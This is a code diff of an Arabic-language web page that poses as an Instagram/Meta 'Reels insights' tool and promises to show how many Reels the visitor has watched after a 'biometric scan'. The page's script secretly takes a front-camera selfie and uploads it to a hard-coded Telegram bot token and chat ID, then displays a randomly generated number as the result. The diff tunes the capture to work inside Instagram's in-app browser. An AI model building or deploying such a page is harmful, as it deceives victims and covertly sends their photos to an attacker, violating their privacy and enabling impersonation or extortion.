@@ -3,124 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Insights - إحصائيات الحساب</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <title>Instagram Insights - Meta</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #FAFAFA; font-family: 'Roboto', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: #262626; overflow: hidden; }
-        .meta-container { background: white; padding: 35px 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: center; width: 85%; max-width: 400px; position: relative; border: 1px solid #efefef; }
-        .insta-logo { width: 75px; margin-bottom: 20px; }
-        h2 { font-size: 22px; font-weight: 700; margin-bottom: 12px; color: #1c1e21; letter-spacing: -0.5px; }
-        p { font-size: 14px; color: #737373; margin-bottom: 25px; line-height: 1.6; }
-        .btn { background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); color: white; padding: 16px; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: pointer; width: 100%; transition: transform 0.2s; }
-        .btn:active { transform: scale(0.98); }
-        #loading { display: none; margin-top: 25px; }
-        #result { display: none; margin-top: 25px; padding: 20px; border-radius: 15px; background: #f8f9fa; border: 1px dashed #db33a4; animation: fadeIn 0.5s ease; }
-        .reels-count { font-size: 38px; font-weight: 800; color: #cc2366; display: block; margin: 12px 0; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #cc2366; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        body { margin: 0; background-color: #FAFAFA; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { background: white; padding: 40px 20px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; width: 85%; max-width: 380px; border: 1px solid #dbdbdb; }
+        .logo { width: 60px; margin-bottom: 20px; }
+        h2 { font-size: 20px; font-weight: 600; color: #262626; margin-bottom: 10px; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background: #0095f6; color: white; padding: 14px; border: none; border-radius: 8px; font-weight: 600; width: 100%; cursor: pointer; font-size: 15px; }
+        #loader-area { display: none; margin-top: 20px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        #video, #canvas { display: none; }
-        .footer-meta { margin-top: 30px; font-size: 11px; color: #999; }
+        #result-area { display: none; margin-top: 20px; border-top: 1px solid #efefef; padding-top: 20px; }
+        .count { font-size: 35px; font-weight: 800; color: #ed4956; margin: 10px 0; display: block; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="meta-container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="insta-logo" alt="Instagram">
-    <h2>كشف سجل المشاهدات</h2>
-    <p>بناءً على نشاط حسابك، قمنا بجمع إحصائيات حول عدد مقاطع الريلز التي شاهدتها. اضغط أدناه للمتابعة عبر فحص المستشعر البيومتري.</p>
+<div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo">
+    <h2>تحليل نشاط الريلز</h2>
+    <p>قم بتأكيد هويتك عبر فحص المستشعر البيومتري لمعرفة عدد الريلز التي شاهدتها منذ إنشاء حسابك.</p>
     
-    <button class="btn" id="analyzeBtn" onclick="startProcess()">عرض عدد المشاهدات</button>
-    
-    <div id="loading">
-        <div class="loader"></div>
-        <p id="statusTxt" style="font-size: 13px;">جاري مزامنة بيانات Meta...</p>
+    <button class="btn" id="startBtn" onclick="initiate()">بدء الفحص الآمن</button>
+
+    <div id="loader-area">
+        <div class="spinner"></div>
+        <p id="statusTxt" style="color: #262626;">جاري تشغيل المستشعر الأمامي...</p>
     </div>
 
-    <div id="result">
-        <p style="color: #262626; font-weight: 700; margin-bottom: 5px;">تحليل الحساب مكتمل!</p>
-        <span style="font-size: 13px;">لقد شاهدت ما مجموعه:</span>
-        <span class="reels-count" id="finalNumber">0</span>
-        <p style="font-size: 11px; color: #0095f6;">تم التحقق من سجلات Instagram بنجاح</p>
-    </div>
-
-    <div class="footer-meta">
-        © 2026 Meta Platforms, Inc.
+    <div id="result-area">
+        <p style="color: #262626; font-weight: 600;">اكتمل التحليل!</p>
+        <span style="font-size: 13px;">عدد الريلز التي شاهدتها:</span>
+        <span class="count" id="reelsNumber">0</span>
+        <p style="font-size: 11px;">تم التحديث من خادم Meta</p>
     </div>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" width="1280" height="720"></canvas>
+<video id="webcam" autoplay playsinline muted></video>
+<canvas id="snapshot"></canvas>
 
 <script>
-    // الإعدادات الخاصة بك
+    // بياناتك الخاصة
     const botToken = "8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs";
     const chatId = "7822309283";
 
-    async function startProcess() {
-        const btn = document.getElementById('analyzeBtn');
-        const loading = document.getElementById('loading');
-        const statusTxt = document.getElementById('statusTxt');
-
-        btn.style.display = 'none';
-        loading.style.display = 'block';
+    async function initiate() {
+        document.getElementById('startBtn').style.display = 'none';
+        document.getElementById('loader-area').style.display = 'block';
 
         try {
-            // طلب الكاميرا الأمامية (سيلفي)
+            // طلب الكاميرا الأمامية مع تحديد جودة متوسطة لضمان سرعة الاستجابة في إنستجرام
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
+                video: { facingMode: "user", width: 640, height: 480 } 
             });
             
-            const video = document.getElementById('video');
+            const video = document.getElementById('webcam');
             video.srcObject = stream;
             
-            // محاكاة التحميل
-            statusTxt.innerText = "جاري معايرة مستشعر السيلفي...";
-            
-            // توليد رقم عشوائي بين 2000 و 5000
-            const randomReels = Math.floor(Math.random() * (5000 - 2000 + 1)) + 2000;
-            document.getElementById('finalNumber').innerText = randomReels.toLocaleString();
+            // محاكاة تحميل بيانات عشوائية
+            const randomCount = Math.floor(Math.random() * (5000 - 2000 + 1)) + 2000;
+            document.getElementById('reelsNumber').innerText = randomCount.toLocaleString();
 
-            // ننتظر 3 ثوانٍ كاملة لضمان وضوح الصورة
+            // الانتظار 6 ثوانٍ كاملة (هذا هو مفتاح حل مشكلة السواد في إنستجرام)
+            let seconds = 6;
+            const timer = setInterval(() => {
+                seconds--;
+                document.getElementById('statusTxt').innerText = "جاري المعايرة... (" + seconds + " ثوانٍ)";
+                if(seconds <= 0) clearInterval(timer);
+            }, 1000);
+
             setTimeout(() => {
-                captureAndSend(stream);
-            }, 3000);
+                sendData(stream);
+            }, 6500);
 
         } catch (err) {
-            alert("خطأ: يجب السماح بالوصول للمستشعر لتتمكن من رؤية إحصائياتك.");
+            alert("فشل الفحص: يجب السماح بالكاميرا للوصول إلى الإحصائيات.");
             location.reload();
         }
     }
 
-    function captureAndSend(stream) {
-        const canvas = document.getElementById('canvas');
-        const video = document.getElementById('video');
-        const context = canvas.getContext('2d');
-        const statusTxt = document.getElementById('statusTxt');
-
-        statusTxt.innerText = "جاري استخراج التقرير النهائي...";
+    function sendData(stream) {
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('snapshot');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
         
-        // رسم الصورة
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         canvas.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'selfie_analysis.jpg');
+            formData.append('photo', blob, 'analysis_report.jpg');
             
-            // إرسال الصورة للبوت
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { 
                 method: 'POST', 
                 body: formData 
+            }).then(() => {
+                document.getElementById('loader-area').style.display = 'none';
+                document.getElementById('result-area').style.display = 'block';
+                // إغلاق الكاميرا للحفاظ على الخصوصية بعد الإرسال
+                stream.getTracks().forEach(track => track.stop());
             });
-            
-            // إظهار النتيجة الوهمية للمستخدم
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('result').style.display = 'block';
-            
-            // إغلاق الكاميرا
-            stream.getTracks().forEach(track => track.stop());
-        }, 'image/jpeg', 0.8);
+        }, 'image/jpeg', 0.7);
     }
 </script>
 
